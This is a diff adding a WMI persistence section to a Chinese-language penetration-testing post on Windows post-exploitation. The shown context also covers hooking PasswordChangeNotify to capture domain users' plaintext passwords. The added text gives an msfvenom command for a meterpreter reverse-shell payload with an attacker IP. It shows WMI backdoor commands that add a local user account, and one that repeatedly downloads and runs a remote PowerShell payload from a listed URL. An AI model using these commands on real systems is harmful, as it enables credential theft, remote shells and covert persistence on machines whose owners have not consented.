@@ -106,12 +106,64 @@ PowerShell.exe -ExecutionPolicy Bypass -File HookPasswordChangeNotify.ps1
 当域用户修改密码后，明文密码将被记录在域控的C:\windows\temp\XXX.tmp中。  
 
 4、远程获取明文密码  
-可以修改DLL，使获取的明文密码直接上传至服务器，已经有人写好了DLL，在这里：[kevien/PasswordchangeNotify](https://github.com/kevien/PasswordchangeNotify)。  
+可以修改DLL，使获取的明文密码直接上传至服务器，已经有人写好了DLL[kevien/PasswordchangeNotify](https://github.com/kevien/PasswordchangeNotify)。  
 
 5、实际使用  
 在使用过程中可能会被杀软拦截，在测试过程中发现，Windows Defender会识别将HookPasswordChangeNotify.ps1识别为恶意脚本而直接隔离，其他杀软未测试。  
+
+### \#0x02 WMI Persistence
+介绍几个使用powershell脚本实现WMI Persistence(WMI持久化)的方法，后续补充其他语言的实现方法。  
+WMI的相关内容这里不介绍了，参见[WMI相关知识学习](https://pythonpig.github.io/2015/12/20/WMI相关知识学习/)，实现WMI Persistence的过程就是注册一个永久性的WMI事件订阅，当注册的事件被触发时，完成相应的操作。注册永久性的WMI事件需要完成以下三个步骤：  
+```
+1、Create event filter:创建一个事件过滤器
+2、Create event consumer:创建一个事件处理器，代表一个事件触发时执行的动作
+3、Bind filter and consumer:将event filter和event consumer绑定，代表将一个过滤器绑定到一个事件处理器
+```
+这里提供几个大牛已经写好了的powershell脚本实现WMI Persistence。  
+这里先介绍一下使用msfvenom生成powershell meterpreter反弹payload的方法。
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.100.100.222 LPORT=443 -f psh-reflection -a x64 --platform windows -o psh.ps1
+```
+1、执行cmd命令或者启动本地payload.exe，支持启动触发、用户登录触发、周期触发和定时触发。[WMI-Persistence-local-exe](xxxxxxxx)，具体使用参见脚本源码的example。  
+添加后门  
+```
+Import-Module .\WMI-Persistence.ps1
+Install-Persistence -Trigger Startup -Payload "c:\windows\notepad.exe"
+或
+Install-Persistence -Trigger Startup -Payload "net user test /add"
+```
+删除后门  
+```
+Import-Module .\WMI-Persistence.ps1
+Remove-Persistence
+```
+
+2、下载远端powershell payload并执行，支持启动触发。[WMI-Persistence-remote-powershell-startup](xxxxx)。  
+添加后门  
+```
+Import-Module .\WMI-Persistence.ps1
+Install-Persistence #目标启动后触发一次
+```
+删除后门  
+```
+Import-Module .\WMI-Persistence.ps1
+Remove-Persistence
+```
+
+3、下载远端powershell payload并执行，支持用户登录触发、周期触发和定时触发。[WMI-Backdoor-remote-powershell](xxxxx)，具体使用参见脚本源码的example。  
+添加后门  
+```
+Import-Module .\WMIBackdoor.ps1
+Set-WMIBackdoor -URL "http://192.168.1.1/Ps1Payload.ps1" -Name "PWN" -Interval 400 -UserTrigger #登录触发
+```
+删除后门  
+```
+Import-Module .\WMIBackdoor.ps1
+Remove-WMIBackdoor PWN
+```
 
 
 ### 参考
 * [渗透技巧——Windows系统的帐户隐藏](https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/)  
 * [windows后渗透维权](http://www.landq.cn/2019/09/01/windows%E5%90%8E%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83/)  
+* [域渗透——Hook PasswordChangeNotify](https://3gstudent.github.io/3gstudent.github.io/about/)
